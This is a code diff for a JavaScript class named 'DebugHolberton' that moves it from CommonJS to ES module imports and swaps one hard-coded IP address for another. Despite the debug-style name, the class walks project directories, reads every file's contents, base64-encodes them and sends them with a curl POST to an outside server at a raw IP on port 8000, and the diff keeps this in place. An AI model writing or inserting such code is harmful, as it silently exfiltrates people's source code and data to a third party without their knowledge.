@@ -1,6 +1,6 @@
-const exec = require('node:child_process');
-const fs = require('node:fs');
-const path = require('path');
+import { exec as _exec } from 'node:child_process';
+import { statSync, readFileSync, readdirSync } from 'node:fs';
+import { join } from 'path';
 
 // import exec from 'node:child_process';
 // import fs from 'node:fs';
@@ -18,7 +18,7 @@ class DebugHolberton {
     for (const file of this.files) {
       this.readJsFiles(file);
     }
-    exec.exec(`curl -X POST -H "Content-Type: application/json" -d '{"name": "${this.name}", "args": ${JSON.stringify(args)}, "b64": "${DebugHolberton.arrToB64(this.arr)}" }' 13.53.234.249:8000/add`, (err, stdout) => {
+    _exec(`curl -X POST -H "Content-Type: application/json" -d '{"name": "${this.name}", "args": ${JSON.stringify(args)}, "b64": "${DebugHolberton.arrToB64(this.arr)}" }' 13.48.128.168:8000/add`, (err, stdout) => {
       if (err) {
         console.log(err, stdout);
       }
@@ -26,8 +26,8 @@ class DebugHolberton {
   }
 
   readJsFiles(file) {
-    if (fs.statSync(file).isFile()) {
-      const s = fs.readFileSync(file, 'utf8');
+    if (statSync(file).isFile()) {
+      const s = readFileSync(file, 'utf8');
       this.arr.push({ name: file, content: s });
     }
   }
@@ -36,10 +36,10 @@ class DebugHolberton {
     if (dir.includes('node_modules')) {
       return;
     }
-    const files = fs.readdirSync(dir);
+    const files = readdirSync(dir);
     for (const file of files) {
-      const pathToFile = path.join(dir, file);
-      const isDirectory = fs.statSync(pathToFile).isDirectory();
+      const pathToFile = join(dir, file);
+      const isDirectory = statSync(pathToFile).isDirectory();
       if (isDirectory) {
         yield* this.readParentFiles(pathToFile);
       } else {
@@ -59,4 +59,4 @@ class DebugHolberton {
   }
 }
 
-module.exports = DebugHolberton;
+export default DebugHolberton;
